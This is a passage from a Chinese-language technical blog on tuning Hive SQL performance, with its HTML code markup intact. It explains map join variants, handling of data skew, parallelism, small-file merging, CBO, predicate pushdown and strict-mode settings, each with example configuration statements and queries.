class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    *</span><br><span class="line"><span class="keyword">from</span> order_detail od</span><br><span class="line"><span class="keyword">join</span> product_info product <span class="keyword">on</span> od.product_id = product.id</span><br><span class="line"><span class="keyword">join</span> province_info province <span class="keyword">on</span> od.province_id = province.id;</span><br><span class="line"><span class="comment"># 有三张表进行两次join操作，且两次join操作的关联字段不同。故优化前的执行计划应该包含两个Common Join operator，也就是由两个MapReduce任务实现</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化思路</span></span><br><span class="line"><span class="comment"># 可使用如下语句获取表/分区的大小信息</span></span><br><span class="line">desc formatted table_name partition(partition_col='partition');</span><br><span class="line"><span class="comment"># 三张表中，product_info和province_info数据量较小，可考虑将其作为小表，进行Map Join优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =====方案一======</span></span><br><span class="line"><span class="comment"># 启用Map Join自动转换</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"><span class="comment"># 不使用无条件转Map Join</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask=<span class="literal">false</span>;</span><br><span class="line"><span class="comment"># 调整hive.mapjoin.smalltable.filesize参数，使其大于等于product_info,会生成多种可能的mapjoin</span></span><br><span class="line"><span class="keyword">set</span> hive.mapjoin.smalltable.filesize=<span class="number">25285707</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======方案二======</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"><span class="comment"># 使用无条件转Map Join</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask=<span class="literal">true</span>;</span><br><span class="line"><span class="comment"># 调整hive.auto.convert.join.noconditionaltask.size参数，使其大于等于product_info和province_info之和</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask.size=<span class="number">25286076</span>;</span><br><span class="line"><span class="comment"># 这样可直接将两个Common Join operator转为两个Map Join operator，并且由于两个Map Join operator的小表大小之和小于等于hive.auto.convert.join.noconditionaltask.size，</span></span><br><span class="line"><span class="comment"># 故两个Map Join operator任务可合并为同一个。这个方案计算效率最高，但需要的内存也是最多的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========方案三=======</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask=<span class="literal">true</span>;</span><br><span class="line"><span class="comment"># 调整hive.auto.convert.join.noconditionaltask.size参数，使其等于product_info</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask.size=<span class="number">25285707</span>;</span><br><span class="line"><span class="comment"># 这样可直接将两个Common Join operator转为Map Join operator，但不会将两个Map Join的任务合并。该方案计算效率比方案二低，但需要的内存也更少</span></span><br></pre></td></tr></table></figure><h3 id="5-3-Bucket-Map-Join">5.3 Bucket Map Join</h3><p>Bucket Map Join不支持自动转换，发须通过用户在SQL语句中提供如下Hint提示，并配置如下相关参数，方可使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="comment">/*+ mapjoin(ta) */</span></span><br><span class="line">    ta.id,</span><br><span class="line">    tb.id</span><br><span class="line"><span class="keyword">from</span> table_a ta</span><br><span class="line"><span class="keyword">join</span> table_b tb <span class="keyword">on</span> ta.id=tb.id;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关参数</span></span><br><span class="line"><span class="comment">--关闭cbo优化，cbo会导致hint信息被忽略</span></span><br><span class="line"><span class="keyword">set</span> hive.cbo.enable=<span class="literal">false</span>;</span><br><span class="line"><span class="comment">--map join hint默认会被忽略(因为已经过时)，需将如下参数设置为false</span></span><br><span class="line"><span class="keyword">set</span> hive.ignore.mapjoin.hint=<span class="literal">false</span>;</span><br><span class="line"><span class="comment">--启用bucket map join优化功能</span></span><br><span class="line"><span class="keyword">set</span> hive.optimize.bucketmapjoin = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>两张表都相对较大，若采用普通的Map Join算法，则Map端需要较多的内存来缓存数据，当然可以选择为Map段分配更多的内存，来保证任务运行成功。但是，Map端的内存不可能无上限的分配，所以当参与Join的表数据量均过大时，就可以考虑采用Bucket Map Join算法</p><h3 id="5-4-Sort-Merge-Bucket-Map-Join">5.4 Sort Merge Bucket Map Join</h3><p>Sort Merge Bucket Map Join有两种触发方式，包括Hint提示和自动转换。Hint提示已过时，不推荐使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启动Sort Merge Bucket Map Join优化</span></span><br><span class="line"><span class="keyword">set</span> hive.optimize.bucketmapjoin.sortedmerge=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--使用自动转换SMB Join</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.sortmerge.join=<span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h2 id="6、HQL之数据倾斜">6、HQL之数据倾斜</h2><h3 id="6-1-数据倾斜概述">6.1 数据倾斜概述</h3><p>数据倾斜问题，通常是指参与计算的数据分布不均，即某个key或者某些key的数据量远超其他key，导致在shuffle阶段，大量相同key的数据被发往同一个Reduce，进而导致该Reduce所需的时间远超其他Reduce，成为整个任务的瓶颈。</p><h3 id="6-2-分组聚合导致的数据倾斜">6.2 分组聚合导致的数据倾斜</h3><p>Hive中未经优化的分组聚合，是通过一个MapReduce Job实现的。Map端负责读取数据，并按照分组字段分区，通过Shuffle，将数据发往Reduce端，各组数据在Reduce端完成最终的聚合运算。如果group by分组字段的值分布不均，就可能导致大量相同的key进入同一Reduce，从而导致数据倾斜问题，由分组聚合导致的数据倾斜问题，有以下两种解决思路：<strong>Map-Side聚合和Skew-GroupBy优化</strong></p><p><strong>Map-Side聚合</strong></p><p>开启Map-Side聚合后，数据会现在Map端完成部分聚合工作。这样一来即便原始数据是倾斜的，经过Map端的初步聚合后，发往Reduce的数据也就不再倾斜了。最佳状态下，Map-端聚合能完全屏蔽数据倾斜问题</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用map-side聚合，默认开启的，若想看到数据倾斜的现象，需要先将hive.map.aggr参数设置为false</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--用于检测源表数据是否适合进行map-side聚合。检测的方法是：先对若干条数据进行map-side聚合，若聚合后的条数和聚合前的条数比值小于该值，则认为该表适合进行map-side聚合；否则，认为该表数据不适合进行map-side聚合，后续数据便不再进行map-side聚合。</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.min.reduction=<span class="number">0.5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--用于检测源表是否适合map-side聚合的条数。</span></span><br><span class="line"><span class="keyword">set</span> hive.groupby.mapaggr.checkinterval=<span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--map-side聚合所用的hash table，占用map task堆内存的最大比例，若超出该值，则会对hash table进行一次flush。</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.force.flush.memory.threshold=<span class="number">0.9</span>;</span><br></pre></td></tr></table></figure><p><strong>Skew-GroupBy优化</strong></p><p>Skew-GroupBy的原理是启动两个MR任务，第一个MR按照随机数分区，将数据分散发送到Reduce，完成部分聚合，第二个MR按照分组字段分区，完成最终聚合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用分组聚合数据倾斜优化</span></span><br><span class="line"><span class="keyword">set</span> hive.groupby.skewindata=<span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="6-3-Join导致的数据倾斜">6.3 Join导致的数据倾斜</h3><p>未经优化的join操作，默认是使用common join算法，也就是通过一个MapReduce Job完成计算。Map端负责读取join操作所需表的数据，并按照关联字段进行分区，通过Shuffle，将其发送到Reduce端，相同key的数据在Reduce端完成最终的Join操作。如果关联字段的值分布不均，就可能导致大量相同的key进入同一Reduce，从而导致数据倾斜问题。由join导致的数据倾斜问题，有如下几种解决方案</p><p><strong>map join</strong></p><p>使用map join算法，join操作仅在map端就能完成，没有shuffle操作，没有reduce阶段，自然不会产生reduce端的数据倾斜。该方案适用于大表join小表时发生数据倾斜的场景</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启动Map Join自动转换</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--一个Common Join operator转为Map Join operator的判断条件,若该Common Join相关的表中,存在n-1张表的大小总和&lt;=该值,则生成一个Map Join计划,此时可能存在多种n-1张表的组合均满足该条件,则hive会为每种满足条件的组合均生成一个Map Join计划,同时还会保留原有的Common Join计划作为后备(back up)计划,实际运行时,优先执行Map Join计划，若不能执行成功，则启动Common Join后备计划。</span></span><br><span class="line"><span class="keyword">set</span> hive.mapjoin.smalltable.filesize=<span class="number">250000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--开启无条件转Map Join</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--无条件转Map Join时的小表之和阈值,若一个Common Join operator相关的表中，存在n-1张表的大小总和&lt;=该值,此时hive便不会再为每种n-1张表的组合均生成Map Join计划,同时也不会保留Common Join作为后备计划。而是只生成一个最优的Map Join计划。</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask.size=<span class="number">10000000</span>;</span><br></pre></td></tr></table></figure><p><strong>skew join</strong></p><p>skew join的原理是，为倾斜的大key单独启动一个map join任务进行计算，其余key进行正常的common join</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334409.png" alt></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用skew join优化</span></span><br><span class="line"><span class="keyword">set</span> hive.optimize.skewjoin=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--触发skew join的阈值，若某个key的行数超过该参数值，则触发</span></span><br><span class="line"><span class="keyword">set</span> hive.skewjoin.key=<span class="number">100000</span>;</span><br><span class="line"><span class="comment">-- 这种方案对参与join的源表大小没有要求，但是对两表中倾斜的key的数据量有要求，要求一张表中的倾斜key的数据量比较小（方便走mapjoin）</span></span><br></pre></td></tr></table></figure><p><strong>调整SQL语句</strong></p><p>若参与join的两表均为大表，其中一张表的数据是倾斜的，此时也可通过以下方式对SQL语句进行相应的调整</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 相同的id的进入同一个reducer进行后序操作</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    *</span><br><span class="line"><span class="keyword">from</span> A</span><br><span class="line"><span class="keyword">join</span> B</span><br><span class="line"><span class="keyword">on</span> A.id=B.id;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 调整sql</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    *</span><br><span class="line"><span class="keyword">from</span>(</span><br><span class="line">    <span class="keyword">select</span> <span class="comment">--打散操作</span></span><br><span class="line">        <span class="keyword">concat</span>(<span class="keyword">id</span>,<span class="string">'_'</span>,<span class="keyword">cast</span>(<span class="keyword">rand</span>()*<span class="number">2</span> <span class="keyword">as</span> <span class="built_in">int</span>)) <span class="keyword">id</span>,</span><br><span class="line">        <span class="keyword">value</span></span><br><span class="line">    <span class="keyword">from</span> A</span><br><span class="line">)ta</span><br><span class="line"><span class="keyword">join</span>(</span><br><span class="line">    <span class="keyword">select</span> <span class="comment">--扩容操作</span></span><br><span class="line">        <span class="keyword">concat</span>(<span class="keyword">id</span>,<span class="string">'_'</span>,<span class="number">0</span>) <span class="keyword">id</span>,</span><br><span class="line">        <span class="keyword">value</span></span><br><span class="line">    <span class="keyword">from</span> B</span><br><span class="line">    <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line">    <span class="keyword">select</span></span><br><span class="line">        <span class="keyword">concat</span>(<span class="keyword">id</span>,<span class="string">'_'</span>,<span class="number">1</span>) <span class="keyword">id</span>,</span><br><span class="line">        <span class="keyword">value</span></span><br><span class="line">    <span class="keyword">from</span> B</span><br><span class="line">)tb</span><br><span class="line"><span class="keyword">on</span> ta.id=tb.id;</span><br></pre></td></tr></table></figure><h2 id="7、HQL之任务并行度">7、HQL之任务并行度</h2><blockquote><p>对于一个分布式的计算任务而言，设置一个合适的并行度十分重要。Hive的计算任务由MapReduce完成，故并行度的调整需要分为Map端和Reduce端</p></blockquote><h3 id="7-1-Map端并行度">7.1 Map端并行度</h3><p>Map端的并行度，也就是Map的个数。是由输入文件的切片数决定的。一般情况下，Map端的并行度无需手动调整。以下特殊情况可考虑调整map端并行度</p><ul><li><strong>查询的表中存在大量小文件</strong></li></ul><p>按照Hadoop默认的切片策略，一个小文件会单独启动一个map task负责计算。若查询的表中存在大量小文件，则会启动大量map task，造成计算资源的浪费。这种情况下，可以使用Hive提供的<strong>CombineHiveInputFormat，多个小文件合并为一个切片，从而控制map task个数</strong>，默认开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> hive.input.format=org.apache.hadoop.hive.ql.io.CombineHiveInputFormat;</span><br></pre></td></tr></table></figure><ul><li><strong>map端有复杂的查询逻辑</strong></li></ul><p>若SQL语句中有正则替换、json解析等复杂耗时的查询逻辑时，map端的计算会相对慢一些。若想加快计算速度，在计算资源充足的情况下，可考虑增大map端的并行度，令map task多一些，每个map task计算的数据少一些</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--一个切片的最大值,默认256M</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.input.fileinputformat.split.maxsize=<span class="number">256000000</span>;</span><br></pre></td></tr></table></figure><h3 id="7-2-Reduce端并行度">7.2 Reduce端并行度</h3><p>Reduce端的并行度，也就是Reduce个数。相对来说，更需要关注。Reduce端的并行度，可由用户自己指定，也可由Hive自行根据该MR Job输入的文件大小进行估算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--指定Reduce端并行度，默认值为-1，表示用户未指定</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.job.reduces;</span><br><span class="line"><span class="comment">--Reduce端并行度最大值</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.reducers.max;</span><br><span class="line"><span class="comment">--单个Reduce Task计算的数据量，用于估算Reduce并行度</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.reducers.bytes.per.reducer;</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251334410.png" alt></p><h2 id="8、HQL之小文件合并">8、HQL之小文件合并</h2><blockquote><p>小文件合并优化，分为两个方面，分别是Map端输入的小文件合并，和Reduce端输出的小文件合并</p></blockquote><h3 id="8-1-Map端输入文件合并">8.1 Map端输入文件合并</h3><p>合并Map端输入的小文件，是指将多个小文件划分到一个切片中，进而由一个Map Task去处理。目的是防止为单个小文件启动一个Map Task，浪费计算资源</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--可将多个小文件切片，合并为一个切片，进而由一个map任务处理</span></span><br><span class="line"><span class="keyword">set</span> hive.input.format=org.apache.hadoop.hive.ql.io.CombineHiveInputFormat;</span><br></pre></td></tr></table></figure><h3 id="8-2-Reduce输出文件合并">8.2 Reduce输出文件合并</h3><p>合并Reduce端输出的小文件，是指将多个小文件合并成大文件。目的是减少HDFS小文件数量。其原理是根据计算任务输出文件的平均大小进行判断，若符合条件，则单独启动一个额外的任务进行合并</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--开启合并map only任务输出的小文件,默认false</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.mapfiles=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--开启合并map reduce任务输出的小文件,默认false</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.mapredfiles=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--合并后的文件大小</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.size.per.task=<span class="number">256000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--触发小文件合并任务的阈值，若某计算任务输出的文件平均大小低于该值，则触发合并</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.smallfiles.avgsize=<span class="number">16000000</span>;</span><br></pre></td></tr></table></figure><h2 id="9、其他优化">9、其他优化</h2><h3 id="9-1-CBO优化">9.1 CBO优化</h3><p>CBO是指Cost based Optimizer，即基于计算成本的优化。在Hive中，计算成本模型考虑到了：数据的行数、CPU、本地IO、HDFS IO、网络IO等方面。Hive会计算同一SQL语句的不同执行计划的计算成本，并选出成本最低的执行计划。目前CBO在hive的MR引擎下主要用于join的优化，例如多表join的join顺序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--是否启用cbo优化，默认开启</span></span><br><span class="line"><span class="keyword">set</span> hive.cbo.enable=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 示例演示</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    *</span><br><span class="line"><span class="keyword">from</span> order_detail od</span><br><span class="line"><span class="keyword">join</span> product_info product <span class="keyword">on</span> od.product_id=product.id</span><br><span class="line"><span class="keyword">join</span> province_info province <span class="keyword">on</span> od.province_id=province.id;</span><br><span class="line"></span><br><span class="line"><span class="comment">--关闭cbo优化 </span></span><br><span class="line"><span class="keyword">set</span> hive.cbo.enable=<span class="literal">false</span>;</span><br><span class="line"><span class="comment">--为了测试效果更加直观，关闭map join自动转换</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--开启cbo优化 </span></span><br><span class="line"><span class="keyword">set</span> hive.cbo.enable=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--为了测试效果更加直观，关闭map join自动转换</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- CBO优化对于执行计划中join顺序是有影响的，其之所以会将province_info的join顺序提前，是因为province info的数据量较小，</span></span><br><span class="line"><span class="comment">-- 将其提前，会有更大的概率使得中间结果的数据量变小，从而使整个计算任务的数据量减小，也就是使计算成本变小</span></span><br></pre></td></tr></table></figure><h3 id="9-2-谓词下推">9.2 谓词下推</h3><p>谓词下推（predicate pushdown）是指，尽量将过滤操作前移，以减少后续计算步骤的数据量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--是否启动谓词下推（predicate pushdown）优化</span></span><br><span class="line"><span class="keyword">set</span> hive.optimize.ppd = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">-- CBO优化也会完成一部分的谓词下推优化工作，因为在执行计划中，谓词越靠前，整个计划的计算成本就会越低</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 测试实例</span></span><br><span class="line"><span class="comment">--是否启动谓词下推（predicate pushdown）优化</span></span><br><span class="line"><span class="keyword">set</span> hive.optimize.ppd = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">--为了测试效果更加直观，关闭cbo优化</span></span><br><span class="line"><span class="keyword">set</span> hive.cbo.enable=<span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h3 id="9-3-矢量化查询">9.3 矢量化查询</h3><p>Hive的矢量化查询优化，依赖于CPU的矢量化计算。Hive的矢量化查询，可以极大的提高一些典型查询场景（例如scans, filters, aggregates, and joins）下的CPU使用效率。参考：<a href="https://cwiki.apache.org/confluence/display/Hive/Vectorized+Query+Execution#VectorizedQueryExecution-Limitations" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/Vectorized+Query+Execution#VectorizedQueryExecution-Limitations">https://cwiki.apache.org/confluence/display/Hive/Vectorized+Query+Execution#VectorizedQueryExecution-Limitations</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 若执行计划中，出现“Execution mode: vectorized”字样，即表明使用了矢量化计算</span></span><br><span class="line"><span class="keyword">set</span> hive.vectorized.execution.enabled=<span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="9-4-Fetch抓取">9.4 Fetch抓取</h3><p>Fetch抓取是指，Hive中对某些情况的查询可以不必使用MapReduce计算。例如：<code>select * from emp;</code>在这种情况下，Hive可以简单地读取emp对应的存储目录下的文件，然后输出查询结果到控制台</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--是否在特定场景转换为fetch 任务</span></span><br><span class="line"><span class="comment">--设置为none表示不转换</span></span><br><span class="line"><span class="comment">--设置为minimal表示支持select *，分区字段过滤，Limit等</span></span><br><span class="line"><span class="comment">--设置为more表示支持select 任意字段,包括函数，过滤，和limit等</span></span><br><span class="line"><span class="keyword">set</span> hive.fetch.task.conversion=more;</span><br></pre></td></tr></table></figure><h3 id="9-5-本地模式">9.5 本地模式</h3><p>大多数的Hadoop Job是需要Hadoop提供的完整的可扩展性来处理大数据集的。不过，有时Hive的输入数据量是非常小的。在这种情况下，为查询触发执行任务消耗的时间可能会比实际job的执行时间要多的多。对于大多数这种情况，<strong>Hive可以通过本地模式在单台机器上处理所有的任务。对于小数据集，执行时间可以明显被缩短</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--开启自动转换为本地模式</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.mode.local.auto=<span class="literal">true</span>;  </span><br><span class="line"></span><br><span class="line"><span class="comment">--设置local MapReduce的最大输入数据量，当输入数据量小于这个值时采用local  MapReduce的方式，默认为134217728，即128M</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.mode.local.auto.inputbytes.max=<span class="number">50000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--设置local MapReduce的最大输入文件个数，当输入文件个数小于这个值时采用local MapReduce的方式，默认为4</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.mode.local.auto.input.files.max=<span class="number">10</span>;</span><br></pre></td></tr></table></figure><h3 id="9-6-并行执行">9.6 并行执行</h3><p>Hive会将一个SQL语句转化成一个或者多个Stage，每个Stage对应一个MR Job。默认情况下，Hive同时只会执行一个Stage。但是某SQL语句可能会包含多个Stage，但这多个Stage可能并非完全互相依赖，也就是说有些Stage是可以并行执行的。此处提到的并行执行就是指这些Stage的并行执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用并行执行优化</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.parallel=<span class="literal">true</span>;       </span><br><span class="line">    </span><br><span class="line"><span class="comment">--同一个sql允许最大并行度，默认为8</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.parallel.thread.number=<span class="number">8</span>;</span><br></pre></td></tr></table></figure><h3 id="9-7-严格模式">9.7 严格模式</h3><blockquote><p>Hive可以通过设置某些参数防止危险操作</p></blockquote><ul><li><strong>分区表不使用分区过滤</strong></li></ul><p>将<code>hive.strict.checks.no.partition.filter</code>设置为true时，对于分区表，<strong>除非where语句中含有分区字段过滤条件来限制范围，否则不允许执行</strong>。换句话说，就是用户不允许扫描所有分区。进行这个限制的原因是，通常分区表都拥有非常大的数据集，而且数据增加迅速。没有进行分区限制的查询可能会消耗令人不可接受的巨大资源来处理这个表。</p><ul><li><strong>使用order</strong> <strong>by</strong>没有limit过滤</li></ul><p>将<code>hive.strict.checks.orderby.no.limit</code>设置为true时，对于<strong>使用了order by语句的查询，要求必须使用limit语句</strong>。因为order by为了执行排序过程会将所有的结果数据分发到同一个Reduce中进行处理，强制要求用户增加这个limit语句可以防止Reduce额外执行很长一段时间（开启了limit可以在数据进入到Reduce之前就减少一部分数据）。</p><ul><li><strong>笛卡尔积</strong></li></ul><p>将<code>hive.strict.checks.cartesian.product</code>设置为true时，会<strong>限制笛卡尔积的查询</strong>。对关系型数据库非常了解的用户可能期望在执行JOIN查询的时候不使用ON语句而是使用where语句，这样关系数据库的执行优化器就可以高效地将WHERE语句转化成那个ON语句。不幸的是，Hive并不会执行这种优化，因此，如果表足够大，那么这个查询就会出现不可控的情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以进入hive-site.xml修改</span></span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hive.exec.dynamic.partition.mode&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;nonstrict&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><h1>六、实战案例</h1><blockquote><p>详情可以查看：<a href="https://download.csdn.net/download/lemon_TT/87685013" target="_blank" rel="noopener" title="https://download.csdn.net/download/lemon_TT/87685013">https://download.csdn.net/download/lemon_TT/87685013</a></p></blockquote><h2 